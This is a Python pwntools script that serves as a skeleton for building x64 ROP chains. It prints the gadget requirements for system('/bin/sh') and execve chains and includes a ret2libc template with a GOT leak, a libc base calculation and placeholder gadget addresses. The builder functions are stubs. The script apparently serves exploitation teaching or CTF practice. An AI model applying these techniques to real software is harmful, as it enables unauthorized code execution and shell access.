#!/usr/bin/env python3
"""
ROP Chain Skeleton - Template for building x64 ROP chains
Provides common gadget patterns and helpers
Usage:
    python rop_chain_skeleton.py <binary> [libc_path]
    python rop_chain_skeleton.py ./vuln /lib/x86_64-linux-gnu/libc.so.6
"""

import sys
from pwn import *


class RopChain:
    """Simple ROP chain builder"""

    def __init__(self, binary, libc_path=None):
        self.elf = ELF(binary, checksec=False)
        self.libc = None
        self.gadgets = {}

        if libc_path:
            self.libc = ELF(libc_path, checksec=False)

        self._find_gadgets()

    def _find_gadgets(self):
        """Find common gadgets in binary"""
        # These are common offset gadgets, adjust based on actual binary
        # Common patterns to search for:
        self.gadgets["pop_rdi"] = None
        self.gadgets["pop_rsi"] = None
        self.gadgets["pop_rdx"] = None
        self.gadgets["pop_rax"] = None
        self.gadgets["ret"] = None

        # Try to find pop rdi; ret
        for section in self.elf.sections:
            if section.name in [".text", ".plt"]:
                # Note: In real usage, use actual gadget finder (ROPgadget, ropper, rp++)
                pass

        print("[*] Gadgets found (use ROPgadget/ropper to find actual offsets):")
        print("[*] Common x64 calling convention (System V AMD64 ABI):")
        print("      1st arg: rdi")
        print("      2nd arg: rsi")
        print("      3rd arg: rdx")
        print("      4th arg: rcx")
        print("      5th arg: r8")
        print("      6th arg: r9")

    def build_read_write_chain(self):
        """Build chain to call read() syscall"""
        print("\n[*] Example: Call read(STDIN, buffer, size)")
        print("    Gadgets needed:")
        print("      - pop rdi; ret (set fd to 0)")
        print("      - pop rsi; ret (set buffer address)")
        print("      - pop rdx; ret (set size)")
        print("      - syscall (or call read from libc)")
        return None

    def build_system_chain(self):
        """Build chain to call system()"""
        if not self.libc:
            print("[-] Need libc for system() chain")
            return None

        print("\n[*] Example: Call system('/bin/sh')")
        print(f"[*] system() at: 0x{self.libc.symbols['system']:x}")
        print("[*] Gadgets needed:")
        print("      - pop rdi; ret (set argument to '/bin/sh' string)")
        print("      - call system()")
        return None

    def build_execve_chain(self):
        """Build chain to call execve()"""
        if not self.libc:
            print("[-] Need libc for execve() chain")
            return None

        print("\n[*] Example: Call execve('/bin/sh', NULL, NULL)")
        print(f"[*] execve() at: 0x{self.libc.symbols['execve']:x}")
        print("[*] Gadgets needed:")
        print("      - pop rdi; ret (rdi = '/bin/sh')")
        print("      - pop rsi; ret (rsi = NULL)")
        print("      - pop rdx; ret (rdx = NULL)")
        print("      - call execve()")
        return None


def print_template():
    """Print basic ROP chain template"""
    print("""
[*] Basic ROP Chain Template (x64):

# Setup
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# Find gadgets manually or with ROPgadget:
# ROPgadget --file vuln | grep 'pop rdi'

pop_rdi = 0x401234  # From ROPgadget
pop_rsi = 0x401235
pop_rdx = 0x401236
ret = 0x401237

# Build payload
offset = 56  # Buffer overflow offset (from cyclic_find)

payload = flat({
    offset: [
        pop_rdi, elf.got['puts'],      # rdi = puts@GOT
        elf.plt['puts'],                # call puts
        elf.symbols['main'],            # return to main
    ]
})

# Send and get leak
io = process([exe])
io.sendline(payload)
leaked = u64(io.recvline()[:8])
print(f"Leaked address: 0x{leaked:x}")

# Calculate libc base
libc_base = leaked - libc.symbols['puts']
print(f"Libc base: 0x{libc_base:x}")

# Build second stage with libc gadgets
system_addr = libc_base + libc.symbols['system']
# ... continue exploit
""")


def main():
    if len(sys.argv) < 2:
        print("Usage: python rop_chain_skeleton.py <binary> [libc_path]")
        print(
            "Example: python rop_chain_skeleton.py ./vuln /lib/x86_64-linux-gnu/libc.so.6"
        )
        print_template()
        sys.exit(0)

    binary = sys.argv[1]
    libc_path = sys.argv[2] if len(sys.argv) > 2 else None

    try:
        chain = RopChain(binary, libc_path)
        chain.build_read_write_chain()
        chain.build_system_chain()
        chain.build_execve_chain()
    except FileNotFoundError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
